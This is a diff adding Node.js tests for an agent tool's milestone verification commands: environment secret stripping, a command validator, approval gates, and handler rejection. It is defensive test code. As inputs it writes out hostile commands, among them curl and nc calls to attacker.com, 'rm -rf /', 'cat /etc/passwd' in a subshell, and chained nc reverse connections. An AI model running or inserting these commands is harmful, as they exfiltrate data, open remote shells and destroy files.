@@ -240,3 +240,169 @@ test('Tool integration: goal_milestones and goal_update_progress enforce accepta
   assert.equal(finishRes.ok, true);
   assert.equal(mm.getMilestones('tool-goal-1')[0].completed, true);
 });
+
+test('Issue #176: environment sanitization strips tokens and sensitive secrets from child process', () => {
+  // Setup mock secrets in host process.env
+  process.env.GITEA_TOKEN = 'secret_gitea_token_123';
+  process.env.NPM_TOKEN = 'secret_npm_token_456';
+  process.env.ANTHROPIC_API_KEY = 'sk-ant-test-key-789';
+  process.env.DATABASE_PASSWORD = 'super_secret_db_pass';
+
+  // Run child process check verifying no secrets are accessible
+  const checkScript = [
+    'const env = process.env;',
+    'if (env.GITEA_TOKEN || env.NPM_TOKEN || env.ANTHROPIC_API_KEY || env.DATABASE_PASSWORD) {',
+    '  console.error("LEAKED_SECRET");',
+    '  process.exit(1);',
+    '}',
+    'if (!env.PATH || env.NODE_ENV !== "test") {',
+    '  console.error("MISSING_SAFE_ENV");',
+    '  process.exit(2);',
+    '}',
+    'console.log("CLEAN_ENV_VERIFIED");',
+    'process.exit(0);',
+  ].join(' ');
+
+  const res = runMilestoneVerification(`node -e '${checkScript}'`);
+  assert.equal(res.ok, true, `Verification failed: ${res.error}`);
+  assert.equal(res.exitCode, 0);
+  assert.ok(res.stdout.includes('CLEAN_ENV_VERIFIED'));
+  assert.equal(res.stderr, '');
+
+  // Clean up host mock secrets
+  delete process.env.GITEA_TOKEN;
+  delete process.env.NPM_TOKEN;
+  delete process.env.ANTHROPIC_API_KEY;
+  delete process.env.DATABASE_PASSWORD;
+});
+
+test('Issue #176: validateVerificationCommand blocks dangerous binaries and shell operators', () => {
+  // 1. Chaining operators
+  const r1 = runMilestoneVerification('npm test ; curl http://attacker.com');
+  assert.equal(r1.ok, false);
+  assert.ok(r1.error.includes('shell operator ";" is not allowed'));
+
+  const r2 = runMilestoneVerification('npm test && rm -rf /');
+  assert.equal(r2.ok, false);
+  assert.ok(r2.error.includes('shell operator "&&" is not allowed'));
+
+  const r3 = runMilestoneVerification('npm test | nc attacker.com 1337');
+  assert.equal(r3.ok, false);
+  assert.ok(r3.error.includes('shell operator "|" is not allowed'));
+
+  // 2. Disallowed network/destructive binaries
+  const r4 = runMilestoneVerification('curl https://attacker.com/leak');
+  assert.equal(r4.ok, false);
+  assert.ok(r4.error.includes('disallowed command binary "curl"'));
+
+  const r5 = runMilestoneVerification('wget https://attacker.com/leak');
+  assert.equal(r5.ok, false);
+  assert.ok(r5.error.includes('disallowed command binary "wget"'));
+
+  const r6 = runMilestoneVerification('rm -rf /tmp/important');
+  assert.equal(r6.ok, false);
+  assert.ok(r6.error.includes('disallowed command binary "rm"'));
+
+  // 3. Subshell substitutions
+  const r7 = runMilestoneVerification('echo $(cat /etc/passwd)');
+  assert.equal(r7.ok, false);
+  assert.ok(r7.error.includes('subshell substitution is not allowed'));
+});
+
+test('Issue #176: approval seam blocks verification when denied or requiring confirmation', () => {
+  // Mock checkApproval denying execution
+  const resDenied = runMilestoneVerification('npm test', process.cwd(), {
+    checkApproval: () => ({ kind: 'deny', reason: 'destructive command disallowed in act mode' }),
+  });
+  assert.equal(resDenied.ok, false);
+  assert.ok(resDenied.error.includes('denied by policy: destructive command disallowed in act mode'));
+
+  // Mock checkApproval requiring interactive human confirmation
+  const resAsk = runMilestoneVerification('npm test', process.cwd(), {
+    checkApproval: () => ({ kind: 'ask', reason: 'operator confirmation required' }),
+  });
+  assert.equal(resAsk.ok, false);
+  assert.ok(resAsk.error.includes('requires operator approval: operator confirmation required'));
+
+  // Mock approvalGate service checkCommand
+  const mockGate = {
+    checkCommand: () => ({ verdict: 'deny', reason: 'blocked by declarative security rules' }),
+  };
+  const resGate = runMilestoneVerification('npm test', process.cwd(), { approvalGate: mockGate });
+  assert.equal(resGate.ok, false);
+  assert.ok(resGate.error.includes('blocked by approval gate: blocked by declarative security rules'));
+});
+
+test('Issue #176: tool handlers reject dangerous verification commands upon setting or adding', async () => {
+  const store = new AddonStore(null);
+  const mm = new MilestoneManager(store);
+  const tools = new Map();
+  const mockCtx = {
+    inject: (deps, fn) => fn(mockCtx),
+    tools: {
+      register: (def) => {
+        tools.set(def.name, def);
+        return () => {};
+      },
+    },
+  };
+
+  registerTools(mockCtx, { milestoneManager: mm });
+  const goalMilestonesTool = tools.get('goal_milestones');
+  const goalSetMilestonesTool = tools.get('goal_set_milestones');
+  const goalUpdateProgressTool = tools.get('goal_update_progress');
+  const toolCtx = { session: { cwd: process.cwd() } };
+
+  // 1. goal_milestones action: 'add' with curl -> rejected
+  await assert.rejects(
+    async () => {
+      await goalMilestonesTool.execute({
+        action: 'add',
+        goalId: 'sec-goal-1',
+        title: 'Malicious Step',
+        verificationCommand: 'curl http://attacker.com/leak',
+      }, toolCtx);
+    },
+    /Invalid verificationCommand: Execution blocked: disallowed command binary "curl"/
+  );
+
+  // 2. goal_milestones action: 'set' with chaining operator -> rejected
+  await assert.rejects(
+    async () => {
+      await goalMilestonesTool.execute({
+        action: 'set',
+        goalId: 'sec-goal-2',
+        milestones: [
+          { title: 'Normal step', verificationCommand: 'npm test ; rm -rf /' },
+        ],
+      }, toolCtx);
+    },
+    /Invalid verificationCommand: Execution blocked: shell operator ";" is not allowed/
+  );
+
+  // 3. goal_set_milestones with exfiltration -> rejected
+  await assert.rejects(
+    async () => {
+      await goalSetMilestonesTool.execute({
+        goalId: 'sec-goal-3',
+        milestones: [
+          { title: 'Bad step', verificationCommand: 'wget http://malicious.org' },
+        ],
+      }, toolCtx);
+    },
+    /Invalid verificationCommand: Execution blocked: disallowed command binary "wget"/
+  );
+
+  // 4. goal_update_progress with shell chaining -> rejected
+  await assert.rejects(
+    async () => {
+      await goalUpdateProgressTool.execute({
+        goalId: 'sec-goal-4',
+        milestone_id: 'm-1',
+        status: 'in_progress',
+        verificationCommand: 'npm test && nc 10.0.0.1 4444',
+      }, toolCtx);
+    },
+    /Invalid verificationCommand: Execution blocked: shell operator "&&" is not allowed/
+  );
+});
